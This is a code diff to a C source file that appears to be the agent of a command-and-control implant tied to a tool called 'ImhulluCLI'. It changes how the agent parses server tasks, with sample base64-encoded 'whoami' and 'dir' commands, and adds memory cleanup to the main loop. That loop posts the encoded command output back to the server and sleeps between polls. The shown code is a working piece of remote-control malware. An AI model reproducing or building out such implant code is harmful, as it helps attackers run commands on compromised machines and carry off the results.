@@ -4,6 +4,7 @@
 #include "../include/addresshunter.h"
 #include "../include/http.h"
 #include "../include/typedefs.h"
+#include <time.h>
 
 // will be overwritten by ImhulluCLI
 #ifndef SERVER_M
@@ -121,9 +122,7 @@ Output:
     A `Tokens` struct whose member `tokenizedString` needs to be freed
 
 Note:
-    The first token can be retrieved by using the `tokenizedString` member as a CHAR*
-
-    The rest of the tokens can be retrieved using the getToken function
+    The tokens can be retrieved using the getToken function
 
     // TODO: the final numberOfTokens value is not accurate if the last char 
     // or `delim` is not a null byte or if there are consecutive delimiters
@@ -335,8 +334,34 @@ CHAR* myTrim(PAPI api, CCHAR* str, CHAR trim)
     return outStr;
 }
 
+typedef struct jsonTask
+{
+    CHAR* taskId;
+    CHAR* task;
+    CHAR* taskType;
+    CHAR* uuid;
+} JsonTask, PJsonTask;
+
 CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** uuid)
 {
+    /*
+    general structure of a json request
+    [
+        [
+            284,
+            "d2hvYW1p",
+            "cmd",
+            "9b6bf013-27ff-44ae-a39e-5020f3e0cb39"
+        ],
+        [
+            285,
+            "ZGly",
+            "cmd",
+            "9b6bf013-27ff-44ae-a39e-5020f3e0cb39"
+        ]
+    ]
+    */
+
     CHAR* tmpJson = json;  // myStrtok modifies the string itself
     CHAR* task;
     CHAR delim = { '\n' };
@@ -356,71 +381,53 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
     #endif
 
     CHAR* token;
-    CHAR* trimmedToken;
-    CHAR* finalToken;
+    CHAR* trimmedToken1;
+    CHAR* trimmedToken2;
 
-    token = getToken(api, tokensStruct, 0);
-    myStartTrim(api, token, ' ');
-    ((PRINTF)api->printf)(token);
+    // this part of the code messy and can be improved using a struct(?)
 
-    ((FREE)api->free)(tokensStruct.tokenizedString);
+    // start with the third line in the json because the first two are '['
+    token = getToken(api, tokensStruct, 2);
+    // remove spaces from the line
+    trimmedToken1 = myTrim(api, token, ' ');
+    // remove the comma
+    *taskId = myEndTrim(api, trimmedToken1, ',');
 
-    /*
-    trimmedToken = myTrim(api, token, ' ');
-    finalToken = myEndTrim(api, trimmedToken, ',');
+    ((FREE)api->free)(trimmedToken1);
+    trimmedToken1 = NULL;
 
-    ((PRINTF)api->printf)(finalToken);
-    ((FREE)api->free)(trimmedToken);
-    ((FREE)api->free)(finalToken);
-    trimmedToken = NULL;
-    finalToken = NULL;
-    */
+    token = getToken(api, tokensStruct, 3);
+    trimmedToken1 = myTrim(api, token, ' ');
+    trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
+    // remove the double quotes
+    task = myTrim(api, trimmedToken2, '"');
 
-    /*
-    for (int index = 0; index < tokensStruct.numberOfTokens; index++)
-    {
-        token = getToken(api, tokensStruct, index);
-        trimmedToken = myTrim(api, token, ' ');
-        finalToken = myEndTrim(api, trimmedToken, ',');
+    ((FREE)api->free)(trimmedToken1);
+    trimmedToken1 = NULL;
+    ((FREE)api->free)(trimmedToken2);
+    trimmedToken2 = NULL;
 
-        ((PRINTF)api->printf)(finalToken);
-        ((FREE)api->free)(trimmedToken);
-        ((FREE)api->free)(finalToken);
-        trimmedToken = NULL;
-        finalToken = NULL;
+    token = getToken(api, tokensStruct, 4);
+    trimmedToken1 = myTrim(api, token, ' ');
+    trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
+    // remove the double quotes
+    *taskType = myTrim(api, trimmedToken2, '"');
 
-        //((PRINTF)api->printf)(getToken(api, tokensStruct, index));
-    }
-    */
+    ((FREE)api->free)(trimmedToken1);
+    trimmedToken1 = NULL;
+    ((FREE)api->free)(trimmedToken2);
+    trimmedToken2 = NULL;
 
-    /*
-    // SKIP [ and ]
-    for (int i=0; i<=myStrlenA(blacklist)-1; i++)
-    {
-        for (int j=0; j<=myStrlenA(token)-1; j++)
-        {
-            if (token[j] == blacklist[i])
-            {
-                token = myStrtok(tmpJson, delim, FALSE);
-                i=-1;
-                break;
-            }
-        }
-    }
+    token = getToken(api, tokensStruct, 5);
+    trimmedToken1 = myTrim(api, token, ' ');
+    trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
+    // remove the double quotes
+    *uuid = myTrim(api, trimmedToken2, '"');
 
-    // dont look
-    *taskId = myTrim(token, ' ');
-    *taskId = myEndTrim(*taskId, ',');
-    task = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
-    task = myEndTrim(task, ',');
-    task = myTrim(task, '"');
-    *taskType = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
-    *taskType= myEndTrim(*taskType, ',');
-    *taskType = myTrim(*taskType, '"');
-    *uuid = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
-    *uuid = myEndTrim(*uuid, ',');
-    *uuid = myTrim(*uuid, '"');
-    */
+    ((FREE)api->free)(trimmedToken1);
+    trimmedToken1 = NULL;
+    ((FREE)api->free)(trimmedToken2);
+    trimmedToken2 = NULL;
 
     return task;
 }
@@ -706,25 +713,35 @@ void myMain()
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
         PostRequest(api, wServer, port, fullPath2, json);
 
+        if (taskId)
+        {
+            ((FREE)api->free)(taskId);
+            taskId = NULL;
+        }
         if (orgOutput)
         {
             ((FREE)api->free)(orgOutput);
+            orgOutput = NULL;
         }
         if (b64EncodedOutput)
         {
             ((FREE)api->free)(b64EncodedOutput);
+            b64EncodedOutput = NULL;
         }
         if (jsonResponse)
         {
             ((FREE)api->free)(jsonResponse);
+            jsonResponse = NULL;
         }
         if (json)
         {
             ((FREE)api->free)(json);
+            json = NULL;
         }
         if (task)
         {
             ((FREE)api->free)(task);
+            task = NULL;
         }
 
         ((SLEEP)api->Sleep)(3000);
@@ -732,6 +749,7 @@ void myMain()
     if (pEsgStdDll->pBuffer)
     {
         ((FREE)api->free)(pEsgStdDll->pBuffer);
+        pEsgStdDll->pBuffer = NULL;
     }
 }
 
